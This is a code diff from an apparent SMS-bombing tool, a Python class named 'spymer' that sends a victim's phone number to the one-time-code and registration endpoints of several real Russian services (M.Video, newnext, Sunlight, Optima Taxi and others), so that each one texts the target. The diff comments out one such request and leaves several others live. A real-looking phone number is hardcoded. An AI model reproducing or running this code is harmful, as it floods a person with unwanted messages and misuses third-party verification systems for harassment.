@@ -90,7 +90,7 @@ class spymer:
 #			privetmir = requests.post('https://api-user.privetmir.ru/api/v2/send-code', data={'login': '9153509908','scope': 'register-user reset-password','checkApproves': 'Y','approve1': 'on','approve2': 'on','code': ''})
 			mvideo = requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 915 3509908','g-recaptcha-response': '','recaptcha': 'on'})
 			newnext = requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
-			optima = requests.post('https://online.optima.taxi/user/get-code', data={'phone': _phone})
+			#optima = requests.post('https://online.optima.taxi/user/get-code', data={'phone': _phone})
 #			s7 = requests.get('https://www.s7.ru/dotCMS/priority/ajaxEnrollment',params={'dispatch': 'shortEnrollmentByPhone', 'mobilePhone.countryCode': '7','mobilePhone.areaCode': _phone[1:4], 'mobilePhone.localNumber': _phone[4:-1]})
 			sunlight = requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
 #			managevoximplant = requests.post('https://api-ru-manage.voximplant.com/api/AddAccount',data={'region': 'eu', 'account_name': _name, 'language_code': 'en','account_email': _name + '@gmail.com', 'account_password': _name})
